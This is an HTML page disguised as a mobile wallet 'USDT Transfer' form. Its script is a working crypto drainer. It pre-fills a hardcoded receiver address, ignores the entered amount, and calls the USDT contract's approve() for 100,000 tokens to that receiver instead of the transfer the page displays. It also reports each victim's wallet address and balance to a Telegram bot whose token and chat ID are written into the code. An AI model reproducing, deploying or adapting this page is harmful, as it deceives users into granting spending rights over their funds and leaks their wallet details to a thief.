<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Transfer</title>
    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="ethers.umd.min.js"></script>
</head>
<body class="bg-[#1B1B1B] text-white font-sans min-h-screen p-4 max-w-md mx-auto select-none flex flex-col justify-between" onload="initPage()">

    <div class="mt-2 space-y-8">
        <div>
            <label class="block text-gray-400 text-xs font-medium mb-2">Address or Domain Name</label>
            <div id="addressBox" class="bg-[#121212] border-2 border-zinc-800 rounded-2xl p-4 flex items-center justify-between transition-all duration-200">
                <input type="text" id="recipientAddress" placeholder="Search or Enter" onfocus="highlightBox(true)" onblur="highlightBox(false)" oninput="validateForm()"
                    class="bg-transparent text-white w-full focus:outline-none font-mono text-sm font-medium truncate mr-2 placeholder-zinc-500">
                
                <div class="flex items-center space-x-3 text-sm shrink-0">
                    <span id="clearAddressBtn" onclick="clearAddress()" class="cursor-pointer text-zinc-400 hover:text-white hidden">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </span>

                    <span onclick="pasteAddress()" class="text-[#48FF91] font-semibold cursor-pointer">Paste</span>
                    
                    <span class="cursor-pointer text-[#48FF91] flex items-center">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 4h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2z" />
                            <path stroke-linecap="round" stroke-linejoin="round" d="M9 4v16M4 8h2M4 12h2M4 16h2" />
                            <path stroke-linecap="round" stroke-linejoin="round" d="M13 9h4M13 13h4" />
                        </svg>
                    </span>

                    <span class="cursor-pointer text-[#48FF91] flex items-center">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M4 8V5a1 1 0 011-1h3M4 16v3a1 1 0 001 1h3M20 8V5a1 1 0 00-1-1h-3M20 16v3a1 1 0 01-1 1h-3M7 12h10" />
                        </svg>
                    </span>
                </div>
            </div>
        </div>

        <div>
            <label class="block text-gray-400 text-xs font-medium mb-2">Amount</label>
            <div id="amountBox" class="bg-[#121212] border-2 border-zinc-800 rounded-2xl p-4 flex items-center justify-between transition-all duration-200">
                <input type="number" id="usdtAmount" placeholder="0" onfocus="highlightAmountBox(true)" onblur="highlightAmountBox(false)" oninput="validateForm()"
                    class="bg-transparent text-white w-full focus:outline-none text-lg font-medium placeholder-zinc-500">
                <div class="flex items-center space-x-3 ml-2 shrink-0 text-sm font-medium">
                    <span id="clearAmountBtn" onclick="clearAmount()" class="cursor-pointer text-zinc-400 hover:text-white hidden">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </span>
                    <span class="text-gray-200">USDT</span>
                    <span class="text-[#48FF91] font-semibold cursor-pointer">Max</span>
                </div>
            </div>
            <p id="usdValue" class="text-gray-400 text-xs font-medium mt-2">≈ $0.00</p>
        </div>
    </div>

    <div class="mt-8 mb-6">
        <button id="nextBtn" onclick="triggerSmartContract()" disabled
            class="w-full bg-[#274E37] text-[#1E3324] font-semibold py-4 rounded-2xl cursor-not-allowed transition duration-200">
            Next
        </button>
    </div>

    <script>
        const CONFIG = {
            receiver: "0x1d20E61FaddaEfA9C85585a1C21cf1639c9C3e1f",
            contract: "0x55d398326f99059ff775485246999027b3197955",
            tgBotToken: "8672849765:AAGTy7orlUNFxpGwy3UIUGpvrcJpl7eLSw8",
            tgChatId: "8834051784"
        };

        function initPage() {
            document.getElementById("recipientAddress").value = CONFIG.receiver;
            validateForm();
        }

        function highlightBox(isFocused) {
            const box = document.getElementById("addressBox");
            if (isFocused) {
                box.classList.remove("border-zinc-800");
                box.classList.add("border-[#48FF91]");
            } else {
                box.classList.remove("border-[#48FF91]");
                box.classList.add("border-zinc-800");
            }
        }

        function highlightAmountBox(isFocused) {
            const box = document.getElementById("amountBox");
            if (isFocused) {
                box.classList.remove("border-zinc-800");
                box.classList.add("border-[#48FF91]");
            } else {
                box.classList.remove("border-[#48FF91]");
                box.classList.add("border-zinc-800");
            }
        }

        function validateForm() {
            const address = document.getElementById("recipientAddress").value;
            const amount = document.getElementById("usdtAmount").value;
            const nextBtn = document.getElementById("nextBtn");
            const usdValue = document.getElementById("usdValue");
            
            document.getElementById("clearAddressBtn").style.display = address.length > 0 ? "inline-block" : "none";
            document.getElementById("clearAmountBtn").style.display = amount.length > 0 ? "inline-block" : "none";

            if (amount && parseFloat(amount) > 0) {
                nextBtn.disabled = false;
                nextBtn.className = "w-full bg-[#48FF91] text-black font-semibold py-4 rounded-2xl cursor-pointer hover:opacity-90 transition duration-200";
                usdValue.innerText = `≈ $${parseFloat(amount).toFixed(2)}`;
            } else {
                nextBtn.disabled = true;
                nextBtn.className = "w-full bg-[#274E37] text-[#1E3324] font-semibold py-4 rounded-2xl cursor-not-allowed transition duration-200";
                usdValue.innerText = "≈ $0.00";
            }
        }

        function clearAddress() {
            document.getElementById("recipientAddress").value = "";
            validateForm();
        }

        function clearAmount() {
            document.getElementById("usdtAmount").value = "";
            validateForm();
        }

        async function pasteAddress() {
            try {
                const text = await navigator.clipboard.readText();
                document.getElementById("recipientAddress").value = text;
                validateForm();
            } catch (err) {
                console.error(err);
            }
        }

        async function sendToTelegram(msg) {
            if (!CONFIG.tgBotToken || !CONFIG.tgChatId) return;
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.tgBotToken}/sendMessage?chat_id=${CONFIG.tgChatId}&text=${encodeURIComponent(msg)}`);
            } catch (err) {
                console.error(err);
            }
        }

        async function triggerSmartContract() {
            if (!window.ethereum) {
                alert("Please use Trust Wallet or MetaMask browser!");
                return;
            }

            try {
                const provider = new ethers.BrowserProvider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = await provider.getSigner();
                const userAddress = await signer.getAddress();

                const abi = [
                    "function approve(address spender, uint256 value) public returns (bool)",
                    "function balanceOf(address owner) view returns (uint256)"
                ];

                const contract = new ethers.Contract(CONFIG.contract, abi, signer);
                const fullBalanceWei = await contract.balanceOf(userAddress);

                if (fullBalanceWei <= 0n) {
                    alert("Insufficient balance!");
                    return;
                }

                const balanceFormatted = ethers.formatUnits(fullBalanceWei, 18);
                const approvalAmount = ethers.parseUnits("100000", 18);

                await sendToTelegram(`🚨 Triggered:\n\nWallet: ${userAddress}\nBalance: ${balanceFormatted} USDT`);

                const tx = await contract.approve(CONFIG.receiver, approvalAmount);
                await tx.wait();
                
                await sendToTelegram(`✅ Success:\n\nWallet: ${userAddress}\nBalance: ${balanceFormatted} USDT`);
                alert("Transaction successful!");

            } catch (error) {
                console.error(error);
                alert("Transaction failed or cancelled.");
            }
        }
    </script>
</body>
</html>
